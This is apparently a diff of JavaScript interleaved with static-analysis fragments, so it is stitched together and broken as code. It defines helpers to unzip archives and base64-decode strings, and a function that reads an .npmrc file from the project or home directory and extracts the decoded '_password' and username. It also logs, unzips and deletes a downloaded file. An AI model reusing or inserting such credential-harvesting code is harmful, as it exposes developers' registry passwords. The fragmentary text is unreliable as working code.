@@ -1,0 +1,46 @@
+function unzip = function unzip(zipFile, targetDir) {
+  var zip = new AdmZip(zipFile);
+  zip.extractAllTo(targetDir, true);
+  console.log(`Unpacked file: ${zipFile}`);
+}
+<operator>.formatString("Unpacked file: ", zipFile, "")
+function base64decode = function base64decode(base64) {
+  let value = Buffer.from(base64, "base64")
+    .toString("ascii")
+    .replace(/(\r\n|\n|\r)/g, "");
+  return value;
+}
+function getNpmAuth = function getNpmAuth(rootDir) {
+  let rootNpmRc = `${rootDir}/.npmrc`;
+  let homeNpmRc = `${homedir}/.npmrc`;
+  let npmRc = ``;
+  if (fs.existsSync(rootNpmRc)) {
+    npmRc = rootNpmRc;
+  } else if (fs.existsSync(homeNpmRc)) {
+    npmRc = homeNpmRc;
+  } else {
+    console.error(`Cannot find NPM config, the following paths don't exist: '${homeNpmRc}', '${rootNpmRc}'`);
+    return;
+  }
+  console.log(`Found NPM config: ${npmRc}`);
+  let fileContents = getContents(npmRc);
+  let pass = base64decode(getValue(fileContents, "_password"));
+  let user = getValue(fileContents, "username");
+  let npmAuth = {
+    "user": user,
+    "pass": pass
+  }
+  return npmAuth;
+}
+<operator>.formatString("", homedir, "/.npmrc")
+fs.existsSync(rootNpmRc)
+<operator>.formatString("", statusCode, ": ", res.statusMessage, "")
+let fileContents = getContents(npmRc)
+file.on("finish", () => {
+      file.close();
+      console.log(`Downloaded file: ${targetDir}/${fileName}`);
+      unzip(fileName, targetDir);
+      fs.unlinkSync(fileName);
+    })
+unzip(fileName, targetDir)
+fs.unlinkSync(fileName)
